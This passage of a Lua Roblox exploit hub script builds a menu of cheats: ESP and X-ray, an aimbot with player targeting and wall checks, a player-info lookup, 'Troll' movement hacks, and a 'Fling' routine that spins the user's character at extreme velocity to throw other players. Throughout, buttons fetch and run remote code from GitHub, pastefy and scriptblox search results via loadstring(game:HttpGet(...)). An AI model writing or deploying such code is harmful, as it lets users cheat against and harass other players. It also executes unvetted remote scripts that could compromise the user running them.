        {N = "Esp Box", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/Box"},
        {N = "X-ray", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/X-ray"},
    }
    
    function UpDataColor()
        for i, v in pairs(EspToggles) do
            if v:Get() then
                v:Set(false)
                v:Set(true)
            end
        end
    end
    
    Esp:CreateSection("Esp Text")
    
    for i, v in pairs(E) do
        local EspRaw = loadstring(game:HttpGet(v.F))()
        if EspRaw then
            table.insert(EspRawScript, EspRaw)
            if v.N == "Esp Highlights" then
                Esp:CreateColorPicker({Name = "Esp Text Color", Color = Color3.fromRGB(255,255,255), Flag = "ColorPicker1", Callback = function(Value)
                    EHT = Value
                    UpDataColor()
                end})
                Esp:CreateSection("Esp Highlights")
                local Toggle = Esp:CreateToggle({
                    Name = v.N,
                    CurrentValue = false,
                    Flag = "Toggle_" ..v.N,
                    Callback = function(Value)
                        if Value then 
                            EspRaw:On(EHH)
                        else 
                            EspRaw:Off()
                        end
                    end
                })
                Esp:CreateColorPicker({Name = "Esp Highlights", Color = Color3.fromRGB(255,255,255), Flag = "ColorPicker1", Callback = function(Value)
                    EHH = Value
                    UpDataColor()
                end})
                table.insert(EspToggles, Toggle)
            elseif v.N == "Esp Line" then
                Esp:CreateSection("Esp Line")
                local Toggle = Esp:CreateToggle({
                    Name = v.N,
                    CurrentValue = false,
                    Flag = "Toggle_" ..v.N,
                    Callback = function(Value)
                        if Value then 
                            EspRaw:On(EHL)
                        else 
                            EspRaw:Off()
                        end
                    end
                })
                Esp:CreateColorPicker({Name = "Esp Line Color", Color = Color3.fromRGB(255,255,255), Flag = "ColorPicker1", Callback = function(Value)
                    EHL = Value
                    UpDataColor()
                end})
                table.insert(EspToggles, Toggle)
            elseif v.N == "Esp Box" then
                Esp:CreateSection("Esp Box")
                local Toggle = Esp:CreateToggle({
                    Name = v.N,
                    CurrentValue = false,
                    Flag = "Toggle_" ..v.N,
                    Callback = function(Value)
                        if Value then 
                            EspRaw:On(EHB)
                        else 
                            EspRaw:Off()
                        end
                    end
                })
                Esp:CreateColorPicker({Name = "Esp Box Color", Color = Color3.fromRGB(255,255,255), Flag = "ColorPicker1", Callback = function(Value)
                    EHB = Value
                    UpDataColor()
                end})
                table.insert(EspToggles, Toggle)
            elseif v.N == "X-ray" then
                Esp:CreateSection("X-ray")
                local Toggle = Esp:CreateToggle({
                    Name = v.N,
                    CurrentValue = false,
                    Flag = "Toggle_" ..v.N,
                    Callback = function(Value)
                        if Value then 
                            EspRaw:On()
                        else 
                            EspRaw:Off()
                        end
                    end
                })
            else
                local Toggle = Esp:CreateToggle({
                    Name = v.N,
                    CurrentValue = false,
                    Flag = "Toggle_" ..v.N,
                    Callback = function(Value)
                        if Value then 
                            EspRaw:On(EHT)
                        else 
                            EspRaw:Off()
                        end
                    end
                })
                table.insert(EspToggles, Toggle)
            end
        else
            print("Error: " ..v.N)
        end
    end
end)

task.spawn(function()
    local UnHub = Window:CreateTab("UnHub Script", 86591853167234)
    UnHub:CreateSection("UnHub Script")
    
    local U = {
        {N = "UnHub: Fe", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/UnHub%3A%20Fe"},
        {N = "UnHub: Audio", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/UnHub%3A%20Audio"},
        {N = "UnHub: Custom animation", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/UnHub%3A%20Custom%20animation"},
        {N = "UnHub: Emote", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/UnHub%3A%20Emote"},
        {N = "Position", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Position"},
        {N = "Calculator", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Calculator"},
        {N = "Fly: Hero", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Fly%3A%20Hero"},
        {N = "Fly: Normal", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Fly%3A%20Normal"},
        {N = "Fly: Soul", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Fly%3A%20Soul"},
        {N = "FreeCam", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/FreeCam"},
        {N = "Spin", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Spin"},
        {N = "NoClip", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/NoClip"},
        {N = "Swim", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Swim"},
        {N = "Invisible", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Invisible"},
        {N = "Part Path", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Part%20Path"},
        {N = "Part Position", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Part%20Position"},
        {N = "Bang", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Bang"},
        {N = "Get Banged", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Get%20Banged"},
        {N = "Shift Lock", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Shift%20Lock"},
        {N = "Gui Edior", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Gui%20Edior"},
        {N = "Executor", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Executor"},
        {N = "Raw Link", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Raw%20Link"},
        {N = "Get Animation", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Get%20Animation"},
        {N = "Cloner", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/UnHub-Script/Cloner"},
    }
    
    for i, u in pairs(U) do
        UnHub:CreateButton({Name = u.N, Callback = function()
            loadstring(game:HttpGet(u.U))()
        end})
    end
end)

task.spawn(function()
    local Dev = Window:CreateTab("Dev Script", 86591853167234)
    Dev:CreateSection("Dev Script")
    
    local D = {
        {N = "SimpleSpy", U = "https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"},
        {N = "Keyboard", U = "https://raw.githubusercontent.com/LEGO89896/Scripts/refs/heads/main/keyboard"},
        {N = "Dex V2", U = "https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"},
        {N = "Dex V3", U = "https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua"},
        {N = "Dex V4", U = "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"},
    }
    
    for i, d in pairs(D) do
        Dev:CreateButton({Name = d.N, Callback = function()
            loadstring(game:HttpGet(d.U))()
        end})
    end
end)

local Aimbot = Window:CreateTab("Aimbot", 11162755592)
Aimbot:CreateSection("Aimbot")

local function GetNP()
	local shortest, nearest = math.huge
	local camPos = cam.CFrame.Position
	local params = RaycastParams.new()
	params.FilterDescendantsInstances = {player.Character}
	params.FilterType = Enum.RaycastFilterType.Blacklist
	params.IgnoreWater = true

	for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
		if plr ~= player and plr.Character then
		    if TeamCheck and not plr.Team ~= player.Team then return end
			local hum = plr.Character:FindFirstChild("Humanoid")
			local root = plr.Character:FindFirstChild("HumanoidRootPart")
			if hum and hum.Health > 0 and root then
				local dist = (root.Position - camPos).Magnitude
				if dist < shortest then
					if WallCheck then
						local hit = workspace:Raycast(camPos, root.Position - camPos, params)
						if not hit or hit.Instance:IsDescendantOf(plr.Character) then
							shortest, nearest = dist, plr
						end
					else
						shortest, nearest = dist, plr
					end
				end
			end
		end
	end
	return nearest
end

local function GetNH()
	local shortestDistance = math.huge
	local nearestTarget = nil

	for _, model in ipairs(workspace:GetDescendants()) do
		if model:IsA("Model") and model:FindFirstChild("Humanoid") and model:FindFirstChild("HumanoidRootPart") then
			local humanoid = model:FindFirstChild("Humanoid")
			local root = model:FindFirstChild("HumanoidRootPart")
			if humanoid.Health > 0 and model ~= player.Character then
				local distance = (root.Position - cam.CFrame.Position).Magnitude
				if distance < shortestDistance then
					shortestDistance = distance
					nearestTarget = model
				end
			end
		end
	end

	return nearestTarget
end

local function GetAA()
	local closest = nil
	local shortestDist = FOVRadius

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			if TeamCheck and not plr.Team == player.Team then return end

			local pos, onScreen = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
			if onScreen then
				local center = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
				local dist = (Vector2.new(pos.X, pos.Y) - center).Magnitude

				if dist <= shortestDist then
					if WallCheck then
						local origin = cam.CFrame.Position
						local direction = (plr.Character.HumanoidRootPart.Position - origin).Unit * 1000
						local raycastParams = RaycastParams.new()
						raycastParams.FilterDescendantsInstances = {player.Character}
						raycastParams.FilterType = Enum.RaycastFilterType.Blacklist

						local result = workspace:Raycast(origin, direction, raycastParams)
						if result and result.Instance:IsDescendantOf(plr.Character) then
							closest = plr
							shortestDist = dist
						end
					else
						closest = plr
						shortestDist = dist
					end
				end
			end
		end
	end
	return closest
end

local AimbotSpeed = 1
local BodyPart = "HumanoidRootPart"
local AimbotNP = false
local SmoothAim = false
local AimbotTarget = nil
local AimbotAAScreenGui = nil
local AimbotAAUIStroke = nil
local AimbotAAFOVCircle = nil
local AimbotAARainbow = false
local CanAimbot = false
local AimbotNH = false
local AimbotNPT = false
local FOVColor = Color3.new(1, 1, 1)
local AimbotAA = false

Aimbot:CreateInput({Name = "Aim To Player", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(Text)
    local txt = tostring(Text):lower()
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= localPlayer then
            if string.find(player.Name:lower(), txt) then
                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if targetHRP then
                    AimbotTarget = player
                end
            end
        end
    end
end})

local AP = Aimbot:CreateDropdown({
    Name = "Aimbot Player",
    Options = Playlist,
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(name)
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower():find(name:lower()) then
                local cam = workspace.Camera
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    AimbotTarget = player
                    break
                end
            end
        end
    end
})

Aimbot:CreateDropdown({
    Name = "Aimbot Body Part",
    Options = {"Body", "Head"},
    CurrentOption = {"Body"},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(name)
        if name == "Body" then
            BodyPart = "HumanoidRootPart"
        elseif name == "Head" then
            BodyPart = "Head"
        end
    end
})

Aimbot:CreateButton({
    Name = "Refresh",
    Callback = function()
        Playlist = {}
        for _, player in ipairs(Players:GetPlayers()) do
            table.insert(Playlist, player.Name)
        end
        AP:Refresh(Playlist)
    end
})

Aimbot:CreateToggle({Name = "Enable Aimbot", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    CanAimbot = Value
end})

Aimbot:CreateToggle({Name = "Enable Aimbot At Nearest Player", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    AimbotNP = Value
end})

Aimbot:CreateToggle({Name = "Enable Aimbot At Nearest Player + Bot [Lag]", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    AimbotNH = Value
end})

Aimbot:CreateToggle({Name = "Enable Aimbot Fov", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    AimbotAA = Value
    if Value then
        AimbotAAScreenGui = Instance.new("ScreenGui", game.CoreGui)
        AimbotAAScreenGui.IgnoreGuiInset = true
        AimbotAAScreenGui.ResetOnSpawn = false
        
        AimbotAAFOVCircle = Instance.new("Frame")
        AimbotAAFOVCircle.Name = "FOV"
        AimbotAAFOVCircle.Parent = AimbotAAScreenGui
        AimbotAAFOVCircle.AnchorPoint = Vector2.new(0.5, 0.5)
        AimbotAAFOVCircle.Position = UDim2.new(0.5, 0, 0.5, 0)
        AimbotAAFOVCircle.Size = UDim2.new(0, FOVRadius * 2, 0, FOVRadius * 2)
        AimbotAAFOVCircle.BackgroundTransparency = 1
        
        AimbotAAUIStroke = Instance.new("UIStroke", AimbotAAFOVCircle)
        AimbotAAUIStroke.Thickness = 2
        AimbotAAUIStroke.Color = FOVColor
        
        local UICorner = Instance.new("UICorner", AimbotAAFOVCircle)
        UICorner.CornerRadius = UDim.new(0.5, 0)
    else
        if AimbotAAScreenGui then
            AimbotAAScreenGui:Destroy()
        end
    end
end})

Aimbot:CreateToggle({Name = "Team Check", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    TeamCheck = Value
end})

Aimbot:CreateToggle({Name = "Wall Check", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    WallCheck = Value
end})

Aimbot:CreateToggle({Name = "Rainbow Fov", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    AimbotAARainbow = Value
end})

Aimbot:CreateSlider({Name = "Fov Size", Range = {0, 100}, Increment = 1, Suffix = "Speed", CurrentValue = 50, Flag = "Slider1", Callback = function(Value)
    local number = tonumber(Value) * 2
    if number then
        FOVRadius = number
        if AimbotAAFOVCircle then
            AimbotAAFOVCircle.Size = UDim2.new(0, number * 2, 0, number * 2)
        end
    end
end})

Aimbot:CreateColorPicker({Name = "Fov Color", Color = Color3.fromRGB(255,255,255), Flag = "ColorPicker1", Callback = function(Value)
    FOVColor = Value
    if AimbotAAUIStroke then
        AimbotAAUIStroke.Color = Value
    end
end})

Aimbot:CreateToggle({Name = "Enable Smooth Aim", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    SmoothAim = Value
end})

Aimbot:CreateSlider({Name = "Aimbot Speed", Range = {0, 100}, Increment = 0.1, Suffix = "Speed", CurrentValue = 1, Flag = "Slider1", Callback = function(Value)
    local number = tonumber(Value)
    if number then
        AimbotSpeed = number
    end
end})

local Troll = Window:CreateTab("Troll", 6862780932)
Troll:CreateSection("Troll")

local RunEgor
local WalkId = ""
local PartInAir = nil

Troll:CreateToggle({Name = "Egor", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    local hum = player.Character.Humanoid
    local Walk, Run = player.Character:WaitForChild("Animate").walk.WalkAnim or player.Character.Animate.walk.WalkAnim, game.Players.LocalPlayer.Character:WaitForChild("Animate").run.RunAnim or player.Character.Animate.run.RunAnim
    if Value then
        hum.WalkSpeed = 6
        workspace.Gravity = 10
        hum.JumpPower = 12
        WalkId = game.Players.LocalPlayer.Character:WaitForChild("Animate").walk.WalkAnim.AnimationId
        Walk.AnimationId = Run.AnimationId
        RunEgor = game:GetService("RunService").Heartbeat:Connect(function()
            for _, track in pairs(hum:GetPlayingAnimationTracks()) do
                track:AdjustSpeed(5)
            end
        end)
    else
        if RunEgor then
            RunEgor:Disconnect()
            RunEgor = nil
        end
        Walk.AnimationId = WalkId
        hum.WalkSpeed = OldWalkSpeed
        workspace.Gravity = OldGravity
        hum.JumpPower = OldJumpPower
    end
end})

Troll:CreateToggle({Name = "Walk On Air", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    if Value then
        local char = player.Character
        local Part = Instance.new("Part")
        Part.Anchored = true
        Part.Transparency = 1
        Part.Size = Vector3.new(10, 1, 10)
        Part.Position = char.HumanoidRootPart.Position + Vector3.new(0, -3.5, 0)
        Part.Parent = workspace
        PartInAir = Part
    else
        PartInAir:Destroy()
        PartInAir = nil
    end
end})

Troll:CreateToggle({Name = "Infinite Jump", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    InfiniteJumpEnabled = Value
    if Value and not InfiniteJumpConnection then
        InfiniteJumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
            if InfiniteJumpEnabled then
                local humanoid = game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
    elseif not Value and InfiniteJumpConnection then
        InfiniteJumpConnection:Disconnect()
        InfiniteJumpConnection = nil
    end
end})

Troll:CreateButton({Name = "Bang", Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/YiXBkjF4/raw"))()
end})

Troll:CreateButton({Name = "Get Bang", Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/Rh1DCTVq/raw"))()
end})

Troll:CreateButton({Name = "No Clip", Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/XA015S3r/raw"))()
end})

Troll:CreateButton({Name = "Invisible", Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/WCsTPR7a/raw"))()
end})

Troll:CreateButton({Name = "Jerk Tool", Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/2bSw36iK/raw"))()
end})

local Search = Window:CreateTab("Search Script", 118685771787843)
Search:CreateSection("Search Script")

local Items = {
    Buttons = {},
    Sections = {}
}

Search:CreateInput({
    Name = "Search Bar",
    CurrentValue = "",
    PlaceholderText = "     Search     ",
    RemoveTextAfterFocusLost = true,
    Callback = function(Text)
        if #Items.Buttons > 0 and Items.Buttons[1]:GetButton().Parent then
            for _, v in ipairs(Items.Buttons[1]:GetButton().Parent:GetChildren()) do
                if v:IsA("Frame") and v.Name == "SectionSpacing" then
                    v:Destroy()
                end
            end
        end
        for _, section in ipairs(Items.Sections) do
            section:Destroy()
        end
        for _, btnValue in ipairs(Items.Buttons) do
            btnValue:Destroy()
        end
        Items.Sections = {}
        Items.Buttons = {}

        local HttpService = game:GetService("HttpService")
        local page = 1
        local keepFetching = true

        while keepFetching do
            local success, result = pcall(function()
                return HttpService:JSONDecode(
                    game:HttpGet("https://scriptblox.com/api/script/search?q=" .. Text .. "&max=100&page=" .. page)
                )
            end)

            if success and result and result.result and result.result.scripts and #result.result.scripts > 0 then
                for _, scriptData in ipairs(result.result.scripts) do
                    local scriptName = scriptData.title or "Unknown Script"
                    local scriptGameName = (scriptData.game and scriptData.game.name) or "Unknown Game"
                    local scriptGameId = (scriptData.game and scriptData.game.gameId) or 0
                    local scriptSlug = scriptData.slug

                    local Image
                    if scriptGameId == 7436755782 then
                        Image = string.format("rbxthumb://type=GameIcon&id=%d&w=512&h=512", scriptGameId)
                    else
                        Image = "rbxthumb://type=GameThumbnail&id="..scriptGameId.."&w=256&h=144"
                    end

                    local Section = Search:CreateSection(scriptGameName)
                    local ButtonValue = Search:CreateImageButton({
                        Name = scriptName,
                        Img = Image,
                        Callback = function()
                            local ok, rawCode = pcall(function()
                                return game:HttpGet("https://scriptblox.com/raw/" .. scriptSlug)
                            end)
                            if ok and rawCode then
                                loadstring(rawCode)()
                            else
                                warn("Failed to load script: " .. scriptName)
                            end
                        end
                    })

                    table.insert(Items.Sections, Section)
                    table.insert(Items.Buttons, ButtonValue)
                end
                page = page + 1
            else
                keepFetching = false
            end
        end
    end
})

local function PlayAnimation(Id)
   if Track and Track.IsPlaying then
      Track:Stop()
   end
   local Animation = Instance.new("Animation")
   Animation.AnimationId = Id
   Track = player.Character.Humanoid:LoadAnimation(Animation)
   Track.Priority = Enum.AnimationPriority.Action
   Track.Looped = true
   Track:Play()
   Track:AdjustSpeed(SpeedAnimation)
end

local function StopAnimation()
   if Track and Track.IsPlaying then
      Track:Stop()
   end
end

local SearchEmote = Window:CreateTab("Search Emote R15", 118685771787843)
SearchEmote:CreateSection("Search Emote R15")

SearchEmote:CreateInput({Name = "Search", CurrentValue = "", PlaceholderText = "Name", RemoveTextAfterFocusLost = true, Callback = function(txt)
    if txt == "" then
        Rayfield:Notify({
            Title = "⚠️ Warn!",
            Content = "Missing name",
            Duration = 6.5,
            Image = 11745872910,
        })
    return
    end
    if #ToggleR15 > 0 and ToggleR15[1]:GetToggle().Parent then
        for _, v in ipairs(ToggleR15[1]:GetToggle().Parent:GetChildren()) do
            if v:IsA("Frame") and v.Name == "SectionSpacing" then
                v:Destroy()
            end
        end
    end
    for i, v in pairs(ToggleR15) do
        v:Destroy()
    end
    ToggleR15 = {}
    CAnimation = 0
    local txt = tostring(txt):lower()
    for i, v in pairs(data) do
        if CAnimation >= MaxAnimation then
            break
        end
        if v.id and v.name then
            if string.find(v.name:lower(), txt) then
                local Object = game:GetObjects("rbxassetid://" .. tostring(v.id))[1]
                if Object and Object:IsA("Animation") then
                    local Toggle = SearchEmote:CreateToggle({Name = v.name, CurrentValue = false, Flag = "Toggle_" ..v.name, Callback = function(Value)
                    	if Value then 
                        	PlayAnimation(Object.AnimationId)
                    	else
                        	StopAnimation()
                    	end
                    end})
                    CAnimation = CAnimation + 1
            	    table.insert(ToggleR15, Toggle)
                end
                if Object then
                    Object:Destroy()
                end
                wait()
            end
        end
    end
end})

local GetInfo = Window:CreateTab("Get Info", 13874214925)
GetInfo:CreateSection("Get Info")

local UsernameInfo
local UserIdInfo
local DisplayNameInfo
local AccountAgeInfo
local AccountCreationDateInfo
local IsOnlineInfo
local IsPlayingInfo
local FriendCountInfo
local FollowerCountInfo
local FollowingCountInfo
local IsBannedInfo
local LastDeviceInfo
local Description
local TextInSearch = 0

GetInfo:CreateInput({Name = "Search", CurrentValue = "", PlaceholderText = "Put Username or UserId", RemoveTextAfterFocusLost = true, Callback = function(txt)
    if txt == "0" then
        Rayfield:Notify({
            Title = "⚠️ Warn!",
            Content = "Failed to get player",
            Duration = 3.5,
            Image = 4483362458,
        })
        TextInSearch = 0
    elseif txt:match("^%d+$") then
        TextInSearch = txt
    else
        local success, userId = pcall(function()
            return Players:GetUserIdFromNameAsync(txt)
        end)
        if success then
            TextInSearch = userId
        else
            Rayfield:Notify({
               Title = "⚠️ Warn!",
               Content = "Failed to get player",
               Duration = 3.5,
               Image = 4483362458,
            })
            TextInSearch = 0
        end
    end
end})

GetInfo:CreateButton({Name = "Search", Callback = function()
    if TextInSearch == 0 then
        Rayfield:Notify({
            Title = "⚠️ Warn!",
            Content = "Failed to get player info",
            Duration = 3.5,
            Image = 4483362458,
        })
    else
        UsernameInfo:Set("Username: Loading...")
        UserIdInfo:Set("UserId: Loading...")
        DisplayNameInfo:Set("DisplayName: Loading...")
        AccountAgeInfo:Set("AccountAge: Loading...")
        AccountCreationDateInfo:Set("Account Creation Date: Loading...")
        IsOnlineInfo:Set("IsOnline: Loading...")
        IsPlayingInfo:Set("IsPlaying: Loading...")
        FriendCountInfo:Set("Friend: Loading...")
        FollowerCountInfo:Set("Follower: Loading...")
        FollowingCountInfo:Set("Following: Loading...")
        IsBannedInfo:Set("IsBanned: Loading...")
        IsVerifiedInfo:Set("IsVerified: Loading...")
        Description:Set("Description: Loading...")
        local okName, name = pcall(function()
        	return Players:GetNameFromUserIdAsync(TextInSearch)
        end)
        local name = okName and name or "nil"
        local api = {}
        local followerCount = {}
        local followingCount = {}
        local friendCount = {}
        pcall(function()
            api = game.HttpService:JSONDecode(game:HttpGet('https://users.roblox.com/v1/users/'..TextInSearch))
            if api then
                IsBannedInfo:Set("IsBanned: "..tostring(api.isBanned) or nil)
                IsVerifiedInfo:Set("IsVerified: "..tostring(api.hasVerifiedBadge) or nil)
                Description:Set("Description: " ..api.description or nil)
                local accountCreatedTime = DateTime.fromIsoDate(api.created).UnixTimestamp
                local currentTime = DateTime.now().UnixTimestamp
                local accountAgeDays = (currentTime - accountCreatedTime) / 86400
                local date = os.date("*t", os.time() - (math.floor(accountAgeDays + 1) * 24 * 60 * 60))
                AccountAgeInfo:Set("AccountAge: " ..math.floor(accountAgeDays + 1))
                AccountCreationDateInfo:Set("Account Creation Date: " ..string.format("%04d/%02d/%02d", date.year, date.month, date.day))
                DisplayNameInfo:Set("DisplayName: " ..api.displayName)
            else
                IsBannedInfo:Set("IsBanned: nil")
                IsVerifiedInfo:Set("IsVerified: nil")
                Description:Set("Description: nil")
                AccountAgeInfo:Set("AccountAge: nil")
                AccountCreationDateInfo:Set("Account Creation Date: nil")
                DisplayNameInfo:Set("DisplayName: nil")
            end
        end)
        local requestFunction = (syn and syn.request) or (http and http.request)
        local function CheckIfOnline(UserId)
            local URL = "https://presence.roproxy.com/v1/presence/users"
            local Body = HttpService:JSONEncode({userIds = {UserId}})
            local response = requestFunction({Url = URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = Body})
            if response.StatusCode ~= 200 then return false end
            local decoded = HttpService:JSONDecode(response.Body)
            local presence = decoded.userPresences[1].userPresenceType
            return tonumber(presence)
        end
        UsernameInfo:Set("Username: "..name)
        UserIdInfo:Set("UserId: " ..TextInSearch)
        if CheckIfOnline(TextInSearch) > 0 then
            IsOnlineInfo:Set("IsOnline: true")
            IsPlayingInfo:Set("IsPlaying: false")
            if CheckIfOnline(TextInSearch) == 2 then
                IsOnlineInfo:Set("IsOnline: true")
                IsPlayingInfo:Set("IsPlaying: true")
            end
        else
            IsOnlineInfo:Set("IsOnline: false")
            IsPlayingInfo:Set("IsPlaying: false")
        end
        task.spawn(function()
            pcall(function()
                followerCount = game.HttpService:JSONDecode(game:HttpGet('https://friends.roproxy.com/v1/users/' ..TextInSearch ..'/followers/count'))
                if followerCount then
                    FollowerCountInfo:Set("Follower: " ..followerCount.count or nil)
                else
                    FollowerCountInfo:Set("Follower: nil")
                end
            end)
            pcall(function()
                followingCount = game.HttpService:JSONDecode(game:HttpGet('https://friends.roproxy.com/v1/users/' ..TextInSearch ..'/followings/count'))
                if followingCount then
                    FollowingCountInfo:Set("Following: " ..followingCount.count or nil)
                else
                    FollowingCountInfo:Set("Following: nil")
                end
            end)
            pcall(function()
                friendCount = game.HttpService:JSONDecode(game:HttpGet('https://friends.roblox.com/v1/users/' ..TextInSearch ..'/friends/count'))
                if friendCount then
                    FriendCountInfo:Set("Friend: " ..friendCount.count or nil)
                else
                    FriendCountInfo:Set("Friend: nil")
                end
            end)
        end)
    end
end})

UsernameInfo = GetInfo:CreateSection("Username: nil")
UserIdInfo = GetInfo:CreateSection("UserId: nil")
DisplayNameInfo = GetInfo:CreateSection("DisplayName: nil")
AccountAgeInfo = GetInfo:CreateSection("AccountAge: nil")
AccountCreationDateInfo = GetInfo:CreateSection("Account Creation Date: nil")
IsOnlineInfo = GetInfo:CreateSection("IsOnline: nil")
IsPlayingInfo = GetInfo:CreateSection("IsPlaying: nil")
FriendCountInfo = GetInfo:CreateSection("Friend: nil")
FollowerCountInfo = GetInfo:CreateSection("Follower: nil")
FollowingCountInfo = GetInfo:CreateSection("Following: nil")
IsBannedInfo = GetInfo:CreateSection("IsBanned: nil")
IsVerifiedInfo = GetInfo:CreateSection("IsVerified: nil")
Description = GetInfo:CreateSection("Description: nil")

local Fling = Window:CreateTab("Fling", 138815366039127)
Fling:CreateSection("Fling")

local function SkidFling(TargetPlayer)
    local Character = player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart

    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle

    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end

    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
        
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
        
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0

            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

